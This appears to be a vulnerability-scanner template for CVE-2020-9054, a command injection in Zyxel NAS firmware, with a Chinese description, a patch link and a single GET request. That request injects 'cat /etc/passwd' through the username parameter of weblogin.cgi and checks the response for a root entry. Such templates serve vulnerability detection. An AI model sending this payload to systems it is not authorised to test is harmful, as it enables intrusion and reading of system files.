id: CVE-2020-9054
info:
  name: Zyxel NAS Firmware 5.21- Remote Code Execution
  author:
  - l0ne1y
  description: |-
    多款ZyXEL产品操作系统命令注入漏洞
    多款ZyXEL产品中存在操作系统命令注入漏洞。远程攻击者可借助特制的HTTP POST或GET请求利用该漏洞执行任意代码。以下产品及版本受到影响：使用V5.21(AAZF.7)C0之前版本固件的NAS326；使用V5.21(AASZ.3)C0之前版本固件的NAS520；使用V5.21(AATB.4)C0之前版本固件的NAS540；使用V5.21(ABAG.4)C0之前版本固件的NAS542；ZyXEL NSA210；ZyXEL NSA220；ZyXEL NSA220+；ZyXEL NSA221；ZyXEL NSA310；ZyXEL NSA310S；ZyXEL NSA320；ZyXEL NSA320S；ZyXEL NSA325；ZyXEL NSA325v2。
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://www.zyxel.com/support/remote-code-execution-vulnerability-of-NAS-products.shtml
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: regex
    regex:
    - 'root:.*:0:0:'
  matchers-condition: and
  path:
  - '{{BaseURL}}/cgi-bin/weblogin.cgi?username=admin'';cat /etc/passwd'
  method: GET
